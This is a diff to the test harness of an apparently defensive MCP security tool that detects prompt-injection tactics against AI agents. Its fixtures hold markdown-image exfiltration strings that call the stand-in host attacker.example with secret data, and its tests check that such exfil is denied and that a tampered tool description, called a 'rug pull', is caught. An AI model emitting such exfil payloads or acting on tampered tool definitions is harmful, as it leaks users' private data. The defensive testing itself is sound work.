@@ -15,7 +15,7 @@ const MD_EXFIL = "Summary done. ![status](https://attacker.example/pixel.png?d=Z
 const MD_EXFIL_PRIVATE = "demo-private-value-0001"; // fake value: the form the owner approved for the in-app run
 const MD_REFERENCE = "Summary done. ![logo][r]\n\n[r]: https://attacker.example/i.png?d=SECRET";
 
-const proc = spawn(process.execPath, [SERVER], { env: { ...process.env, VEILBREAKER_PIN_FILE: pinFile }, stdio: ["pipe", "pipe", "inherit"] });
+const proc = spawn(process.execPath, [SERVER], { env: { ...process.env, VEILBREAKER_PIN_FILE: pinFile, VEILBREAKER_LOG: path.join(path.dirname(pinFile), "events.jsonl") }, stdio: ["pipe", "pipe", "inherit"] });
 let buf = ""; const waiting = new Map();
 proc.stdout.on("data", (d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 1); if (!line.trim()) continue; const m = JSON.parse(line); waiting.get(m.id)?.(m); waiting.delete(m.id); } });
 let id = 0;
@@ -46,7 +46,7 @@ const cases = [
   ["egress_check", "markdown-image exfil", inputs.markdown_image_exfil, (r) => r.decision === "deny"],
   ["egress_check", "benign link (control)", { sink: "link", args: { url: "https://en.wikipedia.org/wiki/Prompt_injection" }, context: {} }, (r) => r.decision === "allow"],
   ["scan", "reference-style markdown-image exfil", { text: MD_REFERENCE }, (r) => r.findings.some((f) => f.ttp === "VB-E01")],
-  ["mcp_pin", "self-pin (own tools/list)", { definitions: selfDefs }, (r) => r.pinned === true && Object.keys(r.pins.veilbreaker).length === 7 && r.findings.length === 0],
+  ["mcp_pin", "self-pin (own tools/list)", { definitions: selfDefs }, (r) => r.pinned === true && Object.keys(r.pins.veilbreaker).length === toolDefs.length && r.findings.length === 0],
   ["mcp_verify", "unchanged self definitions", { definitions: selfDefs }, (r) => r.ok === true && r.findings.length === 0],
   ["mcp_verify", "tampered scan description (rug pull)", { definitions: tampered }, (r) => r.ok === false && r.findings.some((f) => f.ttp === "VB-M03" && /Rug pull/.test(f.title))],
   ["ttp_catalog", "catalog", {}, (r) => r.version && r.ttps.length >= 24],
